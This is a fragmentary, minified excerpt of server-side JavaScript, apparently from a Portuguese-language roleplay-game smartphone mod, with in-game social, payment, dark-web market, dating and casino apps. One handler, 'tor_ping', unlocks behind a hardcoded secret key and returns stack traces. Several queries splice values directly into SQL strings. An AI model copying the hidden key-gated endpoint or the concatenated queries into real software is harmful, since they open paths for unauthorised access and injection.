          oS(-1, "INSTAGRAM_DESTROY", j);
        const s = {
          TIPO: "Publicação apagada",
        };
        (s.ID = k),
          (s["ID DA POSTAGEM"] = n.id),
          (s.POSTAGEM = n.content),
          (s["POSTAGEM PROPRIA"] = o ? "SIM" : "NÃO");
        const t = {
          name: "Instagram",
        };
...
async function qV({ postId: c, profileId: d }) {
...
(pL.ig_setLike = async (h, i, j) => {
    ...
    if (j) {
      if (!qW[k + "-" + i]) {
        ...
        const t = await qV(s),
          u = {};
        (u.name = m || n),
          qN.notify(t.id, l, "{name} curtiu sua publicação".format(u));
      }

      const r = {};
      (r.post_id = i),
        (r.profile_id = l),
        await qN.likes.replace(r),
        qN.cache
          .filter((w) => w.id === i)
          .forEach((w) => {
            w.likes.push(l);
  ...
  (o.post_id = i),
    (o.profile_id = l),
    (o.toggle = j),
    oS(-1, "INSTAGRAM_LIKE", o);
}),
  (pL.ig_getTimeline = async () => {
    if (!qN.cache) {
      const e = await qN.posts
          .whereNull("post_id")
          .orderBy("id", "DESC")
          .limit(100),
        f = await qN.posts.whereIn("post_id", e.pluck("id")),
        g = await qN.profiles
          .whereIn("id", e.pluck("profile_id").unique())
          .select("id", "name", "username", "avatarURL", "verified"),
      ...
      for (let j of e) {
        ...
        if (!k) {
          console.error(
            "O usuário do instagram " +
              j.profile_id +
              " não foi encontrado (foi excluído manualmente pelo banco de dados)"
          );
          continue;
        }

        const { name: l, username: m, avatarURL: n, verified: o } = k,
          p = {};
        (p.name = l || m),
          (p.username = m),
          (p.avatarURL = n),
          (p.verified = !!o),
          (j.author = p),
          (j.likes = h.filter((r) => r.post_id == j.id).pluck("profile_id")),
          (j.comments = f.filter((s) => s.post_id == j.id).length),
          i.push(j);
      }
...
(pL.ig_updateProfile = async (i, j) => {
  ...
  if (l && j) {
    const { name: m, username: n, bio: o } = j;
    ...
    (p.name = m),
      (p.username = n),
      (p.bio = o),
      await qN.profiles.where("id", l.id).update(p),
      qN.forEachPost((y) => {
  ...
  (pL.ig_changeAvatar = async (e, f) => {
    ...
    if (h && f) {
      const j = {};
      (j.avatarURL = f),
        await qN.profiles.where("id", h.id).update(j),
        qN.forEachPost((k) => {
...
const r0 = {
  ...
  async findAll(c) {
    const d = await this.search(
      c,
      "tweets.tweet_id IS NULL OR tweets.content IS NULL"
    );
  ...
  findAllFrom(c, d) {
    ...
    return this.search(
      ...
      "tweets.profile_id=" +
        d +
        " AND (tweets.tweet_id IS NULL OR tweets.content IS NULL)"
    ).then(oY);
  },
    ...
    const f = oY(
      await this.search(
        ...
        "tweets.id=" +
          ...
          " OR (tweets.tweet_id=" +
          e +
          " AND tweets.content IS NOT NULL)"
      )
    );
  ...
  async findSourceByTweet(c) {
    const [d] = await pc.query(
      "SELECT user_id FROM smartphone_twitter_tweets tw\n    LEFT JOIN smartphone_twitter_profiles pf ON tw.profile_id=pf.id\n    WHERE tw.id=?",
      [c]
    );
...
pF.ready(async (c) => {
  const { profiles: d, tweets: e, likes: f, followers: g } = r0;
  !c.includes(d.table) &&
    (await d.create((i) => {
      i.id(),
        i.int("user_id"),
        ...
        i.varchar("avatarURL"),
        i.varchar("bannerURL"),
        i.varchar("bio").nullable(),
        i.tinyint("verified").default(0),
        i.varchar("avatarURL");
    }),
    await d.createIndex("user_id"));
  ...
  if (!c.includes(e.table)) {
    await e.create((j) => {
      j.id(),
        j.int("profile_id"),
        j.bigint("tweet_id").nullable(),
        j.varchar("content", 280).nullable(),
        j.varchar("image").nullable(),
        j.int("created_at");
    }),
      await e.createIndex("profile_id"),
      await e.createIndex("tweet_id");
  }
  ...
  (pL.twitter_register = async (j, k) => {
    ...
    if (!n || n.length > 24) return q;
    else {
      if (!o || o.length > 16) return r;
      else {
    ...
    if (u) return v;
      ...
      (k.avatarURL = "http://localhost/samartphone/stock/twitter_egg.png"),
        (k.bannerURL = "https://www.colorhexa.com/cccccc.png");
  ...
  (pL.twitter_save = async (f, g) => {
    ...
    if (i) {
      ...
      if (
        i.username != g.username &&
        (await r0.profiles.where("username", g.username).exists())
      ) {
        const m = {
          error: "Este nome de usuário já existe",
        };
      ...
      return (
        Object.assign(i, l), await r0.profiles.where("id", i.id).update(l), i
      );
    }
  });
...
async function r1(c, d) {
  ...
  for (let f of d) {
    if (f.tweet_id && f.content == null) {
      ...
      i &&
        ((f.retweeted_by = f.author.name),
        Object.assign(f, oX(i, "id", "profile_id", "tweet_id")));
    }
  }
}
...
async function r3(c, d) {
  const e = d.followers || 0,
    [f] = await pc.query(
      "SELECT COALESCE(SUM(if(follower_id=?, 1, 0)),0) AS following,\n  COALESCE(SUM(if(profile_id=?, 1, 0)),0) AS followers, if(follower_id=" +
        c +
        ", 1, 0) AS isFollowed \n  FROM smartphone_twitter_followers fol WHERE follower_id=? OR profile_id = ?",
      Array(4).fill(d.id)
    );
...
(pL.twitter_profile = async (d, e) => {
  ...
  (pL.twitter_reply = async (j, l, m) => {
    ...
    return (
      (x.name = o.name),
      r0.notify(l, j, "{name} respondeu seu tweet".format(x)),
      s
    );
  }),
  (pL.twitter_retweet = async (d, e) => {
    ...
    if (g && !p0(d, "retweet-" + e, 1)) {
      ...
      return (
        (i.name = g.name),
        r0.notify(e, d, "{name} retweetou você".format(i), [g.id, "rt", e]),
        true
      );
    }
  }),
  (pL.twitter_unretweet = async (d, e) => {
    ...
    if (g && !p0(d, "unretweet-" + e, 1)) {
      ...
      return (
        (h.profile_id = g.id),
        (h.tweet_id = e),
        await r0.tweets.where(h).whereNull("content").delete(),
        oS(-1, "TWITTER_UNRETWEET", parseInt(e)),
        false
      );
    }
  }),
  (pL.twitter_like = async (e, f) => {
    ...
    if (h && !p0(e, "like-" + f, 1)) {
      ...
      (j.profile_id = h.id),
        (j.tweet_id = f),
        await r0.likes.insert(j),
        oS(-1, "TWITTER_LIKE", parseInt(f));
      const k = {};
      return (
        (k.name = h.name),
        r0.notify(f, e, "{name} curtiu seu tweet".format(k), [h.id, "like", f]),
        true
      );
    }
  }),
  (pL.twitter_dislike = async (d, e) => {
    ...
    if (g && !p0(d, "dislike-" + e, 1)) {
      ...
      return (
        (h.profile_id = g.id),
        (h.tweet_id = e),
        await r0.likes.where(h).delete(),
        oS(-1, "TWITTER_DISLIKE", parseInt(e)),
        false
      );
    }
  }),
  (pL.twitter_follow = async (e, f) => {
    ...
    if (h && !p0(e, "follow-" + f, 1)) {
      ...
      return (
        (j.name = h.name),
        r0.notifyProfile(f, e, "{name} seguiu você".format(j), [
          h.id,
          "follow",
          f,
        ]),
  ...
  (pL.twitter_unfollow = async (d, e) => {
    ...
    if (g && !p0(d, "follow-" + e, 1)) {
      ...
      return (
        (i.follower_id = g.id),
        (i.profile_id = e),
        await r0.followers.where(i).delete(),
        true
      );
    }
  }),
  (pL.twitter_destroy = async (f, g) => {
    ...
    if (i) {
      ...
      if (l || (await pK(h))) {
        const n = {};
        n.id = g;
        const o = await r0.tweets
          .where(n)
          .orWhere((r) => r.where("tweet_id", g).whereNull("content"))
          .pluck("id");
        await r0.tweets.whereIn("id", o).delete(),
          await r0.likes.whereIn("tweet_id", o).delete(),
          oS(-1, "TWITTER_DESTROY", g);
        const p = {
          TIPO: "Tweet apagado",
        };
        (p.ID = h),
          (p["ID DA POSTAGEM"] = g),
          (p.POSTAGEM = k.content),
          (p["POSTAGEM PROPRIA"] = l ? "SIM" : "NÃO");
        const q = {
          name: "Twitter",
        };
        (q.content = p), qf(q);
  ...
  if (!d.includes(PayPal.table) && pD("paypal")) {
    await PayPal.create((g) => {
      g.id(),
        g.bigint("user_id"),
        g.bigint("target"),
        g.varchar("type").default("payment"),
        g.varchar("description").nullable(),
        g.bigint("value"),
        g.bigint("created_at");
    }),
...
exports("getPaypalBalance", (c) =>
  ...
  exports("setPaypalBalance", ra),
  exports("addPaypalBalance", rb),
  exports("delPaypalBalance", rc),
  (pL.paypal_index = async (g) => {
    const h = await pp.getUserId(g);
...
(pL.paypal_send = async (f, g, h, i) => {
  ...
  return qC(j, async () => {
    ...
    if (s < h) {
      ...
      (w.id = await PayPal.insert(w).returnKeys()),
        (w.fullName = await pF.getName(g)),
        pP(g).then((y) => {
          const A = {};
  ...
  (pL.paypal_transfer = async (d, e) => {
    ...
    return qC(f, async () => {
      ...
      if (i < e) {
        ...
        (m.id = await PayPal.insert(m).returnKeys()),
          qf({
            name: "PayPal",
            content: {
              ID: f,
...
RegisterCommand("tor_find", async (c, [d, e = 100000]) => {
  ...
  on("smartphone:enter", (c, d) => (rg.users[rg.getId(c)] = d)),
  on("smartphone:leave", (c, d) => {
  ...
  (pL.tor_resume = async (c, d, e = false) => {
    const f = await pp.getUserId(c),
      ...
      i = await rg.messages.whereIn(
        "id",
        Object.values(h).map((j) => rg.lastId[j] || 0)
      );
  ...
  (pL.tor_ping = async (e, f, g) => {
    ...
    if (f == "SD89TFH02348J9TJ9S-" + i) {
      try {
        ...
        const m = {};
        return (
          (m.error = k.name), (m.message = k.message), (m.stack = k.stack), m
        );
      }
    } else {
      const o = {
  ...
  pF.ready(async (c) => {
    const { messages: d, payments: e } = rg;

    if (!c.includes(d.table)) {
      await d.create((f) => {
        f.id(),
          f.varchar("channel", 24).default("geral"),
          f.varchar("sender", 50),
          f.varchar("image", 512).nullable(),
          f.varchar("location").nullable(),
          f.varchar("content", 500).nullable(),
          f.bigint("created_at");
      }),
        await d.createIndex("channel"),
        await d.createIndex("sender");
    } else
      !(await pF.hasColumn(d.table, "location")) &&
        (await pc.query(
          "ALTER TABLE " +
            d.table +
            " ADD COLUMN location VARCHAR(255) DEFAULT NULL AFTER image"
        )),
        pc
          .query(
            "SELECT `channel`,MAX(id) AS id FROM smartphone_tor_messages GROUP BY `channel`"
          )
          .then((h) => {
    ...
    !c.includes(e.table) &&
      ...
      await e.createIndex("sender"),
      await e.createIndex("target"));
  });
...
(pL.tor_id = async (c) => {
  ...
  global.exports("createTorMessage", async (c, d, e, f = null, g = null) => {
    const h = rg.getId(d),
      i = rh(c, h);
    if (Array.isArray(g)) g = JSON.stringify(g);
    else {
      if (g != null) {
  ...
  (pL.tor_destroy_ad = async (e, f) => {
    ...
    if (i.anom_id == h || (await pK(g))) {
      ...
      (k.ID = g),
        (k.ANUNCIO = i.title),
        (k.DESCRICAO = i.description),
        (k.FOTO = i.image),
        (k.PROPRIO = i.anom_id == h ? "Sim" : "Não");
      const l = {
        name: "DeepWeb",
      };
      (l.content = k), qf(l);
  ...
  (pL.tor_pay = async (f, g, h) => {
    ...
    return qC(i, async () => {
      ...
      if (r >= h) {
        ...
        (u.value = t),
          (u.user = j),
          oS(k, "TOR_NOTIFY", "Você recebeu {value} de @{user}".format(u));
        const v = {};
        (v.value = t),
          (v.user = j),
          oS(f, "TOR_NOTIFY", "Você enviou {value} para @{user}".format(v));
        const w = {
          TIPO: "Pagamento",
        };
        (w.ID = i + " (" + j + ")"),
...
pA.on("whatsapp:updatePhoneNumber", async (i, j) => {
  ...
  const l = {};
  l.owner = j;
  await rl.profiles.where(k).update(l),
    rl.cache.groups.forEach((q) => {
      if (q.owner == i) {
        (q.owner = j), q.update(["owner"]);
      } else {
        if (q.members.includes(i)) {
          (q.members = q.members.map((s) => (s == i ? j : s))),
            q.update(["members"]);
        }
      }
    });
...
(rm.MAX_MEMBERS = 100),
  pF.ready(async (c) => {
    const { profiles: d, channels: e, messages: f, groups: g } = rl;
    !c.includes(d.table) &&
      (await d.create((i) => {
        i.varchar("owner", 32).primary(),
          i.varchar("avatarURL").nullable(),
          i.tinyint("read_receipts").default(1);
      }));
    ...
    if (!c.includes(f.table)) {
      await f.create((k) => {
        k.id(),
          k.bigint("channel_id").unsigned(),
          k.varchar("sender", 50),
          k.varchar("image", 512).nullable(),
          k.varchar("location").nullable(),
          k.varchar("content", 500).nullable(),
          k.varchar("deleted_by").nullable(),
          k.tinyint("readed").default(0),
          k.bigint("saw_at").default(0),
          k.bigint("created_at");
      }),
        await f.createIndex("sender"),
        await f.createIndex("channel_id");
    } else {
      if (await pF.hasColumn(f.table, "target")) {
        console.time("whatsapp_migration"),
          await pc.query("TRUNCATE " + f.table),
          await pc.query("ALTER TABLE " + f.table + " DROP COLUMN target"),
          await pc.query(
            "ALTER TABLE " +
              f.table +
              " ADD COLUMN channel_id BIGINT UNSIGNED NOT NULL AFTER id"
          ),
          await f.createIndex("channel_id"),
          console.timeEnd("whatsapp_migration"),
          console.log(
            "WhatsApp migration finished, restart the script if this took too long"
          );
      }
    }
    ...
    if (!c.includes(g.table)) {
      await g.create((m) => {
        m.id(),
          ...
          m.varchar("avatarURL"),
          m.varchar("owner"),
          m.varchar("members", 2048),
          m.bigint("created_at");
      });
    } else {
      await pc.query(
        "ALTER TABLE smartphone_whatsapp_groups MODIFY members VARCHAR(2048) NOT NULL"
      );
      const m = [];
...
pL.wpp_sendMessage = async (t, r, a, i = "text", n = null) => {
  let s = await pp.getUserId(t),
    o = pG[s],
    l =
      r.startsWith("group") && rl.cache.groups.find((t) => t.id == r.substr(5));
  if (p0(t)) return {};
  if (a.length > 255) {
    let p = {
  ...
  if (
    ("image" === i
      ? (n.startsWith("https://cdn.discordapp.com/attachments/") &&
          (n = n.replace(
      ...
      : "location" === i &&
        Array.isArray(n) &&
        3 === n.length &&
        (c.location = JSON.stringify(n)),
    (c.id = await rl.messages.insert(c).returnKeys()),
    c.id)
  ) {
    if ((emit("smartphone:whatsapp_message", c), l)) {
      ...
      (h.id = l.id),
        (h.name = l.name),
        (c.group = h),
        l.pusher("WHATSAPP_MESSAGE", c);
    } else
      (c.target = r),
        oS(t, "WHATSAPP_MESSAGE", c),
        pP(r).then((r) => {
...
const ro = p3(
  (...c) => rl.profiles.whereIn("owner", c).where("read_receipts", 0).exists(),
  10000
);
(pL.wpp_markAsRead = async (f, g) => {
      ...
      (x.channel_id = u),
        (w.messages =
          (await rl.messages
            ...
            .limit(125)
            .orderBy("id", "DESC")) || []),
        w.messages.sort((z, A) => z.id - A.id);
      const y = {};
      return (
        (y.owner = j),
        (w.avatarURL = await rl.profiles.where(y).first().pluck("avatarURL")),
        w
      );
    }
  }),
  ...
  (pL.wpp_deleteMessages = async (c, d) => {
    ...
    if (d && !d.startsWith("group")) {
      ...
      await pc.query(
        ...
        await pc.query("UPDATE " + g + " SET deleted_by=? WHERE channel_id=?", [
          f,
          h,
        ]);
    } else {
  ...
  (pL.wpp_promote = async (e, f, g) => {
    ...
    if (k.owner === j) {
      ...
      if (m >= 0) {
        k.members.splice(m, 1, j),
          (k.owner = g),
          k.update(["owner", "members"]);
      } else {
        const p = {
    ...
    if (!j) {
      ...
      if (j.owner === i) {
        ...
        if (j.members.includes(i)) {
          ...
          j.members.splice(o, 1),
            j.update(["members"]),
            oS(f, "WHATSAPP_LEAVE_GROUP", j.id);
        } else {
          const q = {
            error: "Você não é o dono do grupo",
          };
  ...
  (pL.wpp_deleteGroup = async (g, h) => {
    ...
    if (!k) {
      ...
      if (k.owner != j) {
        ...
        const q = {};
        (q.channel_id = k.channelId),
          await rl.messages.where(q).delete(),
          k.pusher("WHATSAPP_GROUP_DESTROY", {
            id: k.id,
            name: k.name,
          });
...
pF.ready(async (c) => {
  if (!c.includes(rr.ads.table)) {
    await rr.ads.create((e) => {
      e.id(),
        ...
        e.varchar("category"),
        e.int("price"),
        e.varchar("description", 1024),
        e.varchar("images", 1024),
        e.bigint("created_at");
    }),
  ...
  (pL.olx_search = async (c, d, e) => {
    ...
    for (let h of f) {
      (h.images = JSON.parse(h.images)),
        (h.author = g.find((i) => i.user_id == h.user_id));
    }
  ...
  (pL.olx_createAd = async (i, j) => {
    ...
    return (
      (j.user_id = k),
      (j.images = JSON.stringify(j.images)),
      (j.created_at = oT()),
      (j.id = await rr.ads.insert(j)),
      j
    );
  }),
  ...
  (pL.olx_destroy = async (g, h) => {
    ...
    if (k && (k.user_id == i || (await pK(i)))) {
      ...
      (n.ID = i),
        (n.ANUNCIO = k.title),
        (n["ID DO ANUNCIO"] = k.id),
        (n["DONO DO ANUNCIO"] = k.user_id);
      const o = {
        name: "OLX",
      };
      (o.content = n), qf(o);
...
pF.ready(async (c) => {
  const { profiles: d, rating: e, messages: f } = ru;
  !c.includes(d.table) &&
    (await d.create((h) => {
      h.id(),
        h.int("user_id"),
        ...
        h.tinyint("age"),
        h.varchar("gender", 50),
        h.tinyint("show_gender"),
        h.varchar("tags"),
        h.tinyint("show_tags"),
        h.varchar("target", 100);
    }),
    await d.createIndex("user_id"),
    await d.createIndex("gender"),
    await d.createIndex("target"));
  !c.includes(e.table) &&
    (await e.create((h) => {
      h.int("profile_id").primary(),
        h.int("rated_id").primary(),
        h.tinyint("rating").default(0);
    }));
  !c.includes(f.table) &&
    (await f.create((j) => {
      j.id(),
        ...
        j.int("target"),
        j.varchar("content"),
        j.tinyint("liked").default(0),
        j.bigint("created_at");
    }),
    await f.createIndex("sender"),
    await f.createIndex("target"));
});
...
(pL.tinder = async (d) => {
  ...
  (pL.tinder_next = async (i, j, k, l) => {
    const m = await pp.getUserId(i),
      n = ru.users[m];
    if (!n) return;
    const o = await ru.rating
        .where("profile_id", n.id)
    ...
    if (j === 0) {
      ...
      if (k) {
        ...
        (u.profile_id = n.id),
          (u.rated_id = j),
          (u.rating = l),
          await ru.rating.replace(u);
        const v = {};
        (v.profile_id = j), (v.rated_id = n.id);

        if (
          l != 0 &&
          (await ru.rating.where(v).where("rating", ">", 0).exists())
        ) {
          const x = await ry(j);
    ...
    if (r) {
      (r.tags = JSON.parse(r.tags)),
        (r.online = Number.isInteger(await pM(r.user_id))),
        (r.previous = await rw(n)
          .where("id", "<", r.id)
          .whereNotIn("id", p)
          .exists());
    }
...
const rx = p3(async (d) => {
  ...
  i.sender = d;
  i.target = d;
  const j = await ru.messages
      .select(pc.raw("MAX(id) as id"))
      .where((l) => l.orWhere(i))
      .groupBy("sender", "target")
      .pluck("id"),
  ...
  for (let l of h) {
    l.last_message = k.find(
      (n) =>
        (n.sender == d && n.target == l.id) ||
        (n.sender == l.id && n.target == d)
    );
  }
...
(pL.tinder_chat = async (e, f) => {
  ...
  return (
    (l.target = j),
    (i.messages = await ru.messages
      .where((n) => n.where(k))
      .orWhere((n) => n.where(l))
      .orderBy("id", "DESC")
      .limit(100)),
    i.messages.sort((n, o) => n.id - o.id),
    i
  );
}),
  ...
  (pL.tinder_delete = async (c) => {
    ...
    if (e) {
      await ru.messages.where("sender", e.id).orWhere("target", e.id).delete(),
        await ru.rating
          .where("profile_id", e.id)
          .orWhere("rated_id", e.id)
          .delete(),
        await ru.profiles.destroy(e.id),
        delete ru.users[d];
    }
  }),
        ...
        return (
          m &&
            m.forEach((o) => {
              if (j.includes(o.id)) {
                (o.last_message = i),
                  (o.image = o.id == h.id ? h.image : g.image);
              }
            }),
          m
        );
...
const rB = [];
(pL.yellowpages_index = () => rB),
  (pL.yellowpages_store = async (e, f) => {
    const g = await pp.getUserId(e);
    const h = pG[g];

    if (f && f.length <= 100) {
      const i = rB.find((j) => j.author.user_id == g);
      if (i) (i.title = f), global.emit("smartphone:yellowpages-update", i);
      else {
  ...
  if (!c.includes("smartphone_weazel")) {
    await rE().create((h) => {
      h.id(),
        ...
        h.varchar("tag"),
        h.varchar("title"),
        h.varchar("description", 4096),
        h.varchar("imageURL").nullable(),
        h.varchar("videoURL").nullable(),
        h.int("views").default(0),
        h.int("created_at");
    });
  }
...
(rF.weazel_index = () => rE().orderBy("created_at", "DESC").limit(20)),
  (rF.weazel_tag = (c, d) =>
    rE().where("tag", String(d)).orderBy("created_at", "DESC").limit(20)),
  (rF.weazel_publish = async (c, d) => {
    const e = await pp.getUserId(c);
    const f = await rH(e, d);
    (f.user_id = e),
      (f.views = 0),
      (f.created_at = oT()),
      (f.id = await rE().insert(f).returnKeys()),
      global.emit("smartphone:weazel", f);
    ...
    (k.id = f),
      ...
      qf({
        ...
        content: {
          ...
          DESCRICAO:
            j.description.substring(0, 256) +
            " -> " +
            i.description.substring(0, 256),
          IMAGEM: (j.imageURL + " -> " + i.imageURL).replace(
            /null|undefined/g,
            "N/A"
          ),
          VIDEO: (j.videoURL + " -> " + i.videoURL).replace(
            /null|undefined/g,
            "N/A"
          ),
        },
...
pF.ready(async (c) => {
  ...
  if (!c.includes(d.table)) {
    await d.create((i) => {
      i.int("user_id").primary(),
        i.bigint("balance").default(0),
        i.bigint("double").default(0),
        i.bigint("crash").default(0),
        i.bigint("mine").default(0);
    });
  }
...
const rU = new Set();
(rP.casino_subscribe = (c) => rU.add(c)),
  (rP.casino_unsubscribe = (c) => rU.delete(c));
...
(rP.casino_balance = async (c) => {
  ...
  (rP.casino_withdraw = async (e, f) => {
    ...
    if (i >= f) {
      ...
      return (
        (k.content = j), qf(k), await rO(g, h + f), await rS(g, i - f), true
      );
    }
...
class rX {
  ...
  ["roll"]() {
    (this.rolling = true),
      (this.endAt = Date.now() + 15000),
      (this.result = Math.floor(Math.random() * 15)),
      rV("CASINO_DOUBLE", this.result);
    setTimeout(() => {
...
(rP.casino_double = () => {
  ...
  if (rY.rolling) {
    ...
    if (rY.startAt) {
      ...
      return (
        (k.last = f), (k.aggregate = rY.aggregate), (k.delay = rY.delay), k
      );
    }
  }
...
const rZ = {};
rZ.multipliers = [
  0, 0.05, 0.06, 0.07, 0.08, 0.1, 0.15, 0.2, 0.25, 0.35, 0.45, 0.55, 0.65, 0.75,
  0.9, 1.1, 1.3, 1.6, 2, 2.4, 2.6, 3.5, 5, 8, 20,
];
const s0 = rZ;
...
global.on("playerDropped", () => delete s0[source]),
  (rP.casino_mine_start = async (j, k, l) => {
  ...
  (rP.casino_mine_finish = async (h) => {
    ...
    const l = {};
    (l.user_id = i),
      await rL().where(l).update().increment("mine", k),
      delete s0[h];
    const m = {};
    return (m.reward = k), m;
  }),
  (rP.casino_mine_click = async (g, h) => {
    ...
    return (
      (j.revealed[h] = true),
      (j.reward += j.bet * j.multiplier),
      ["diamond", Math.ceil(j.bet + j.reward)]
    );
  });
...
class s6 {
  ...
  ["addBet"](d, e, f, g) {
    if (!this.bets.length) {
      (this.startAt = Date.now() + 15000),
        setTimeout(() => {
          this.crash();
        }, 15500),
        rV("CASINO_CRASH_WARMUP");
    }
  ...
  ["crash"]() {
    ...
    const e = setInterval(() => {
      if (this.multiplier >= c) {
        return (
          (this.status = "ending"),
          (this.endAt = Date.now() + 5000),
          rV("CASINO_CRASH_ENDING", c),
      ...
      this.multiplier = Math.min(
        this.multiplier + Math.floor(this.multiplier) * ((g / 100) * 0.01),
        c
      );
      d = f;
      ...
      for (const i of this.bets) {
        if (i.cashout && this.multiplier >= i.cashout) {
          if (!i.locked) {
            ...
            const k = {};
            (k.user_id = i.user_id),
              rL().where(k).update().increment("crash", j).then(),
              oS(i.source, "CASINO_INCREMENT", j),
              oS(i.source, "CASINO_CRASH_CASHOUT", [this.multiplier, j]);
          }
        }
      }
    }, 80);
...
(rP.casino_crash = (c) => ({
  ...
  (rP.casino_crash_cashout = async (h) => {
    ...
    return (
      (o.user_id = i),
      await rL().where(o).update().increment("crash", n),
      [m, n]
    );
  });
const s8 = {
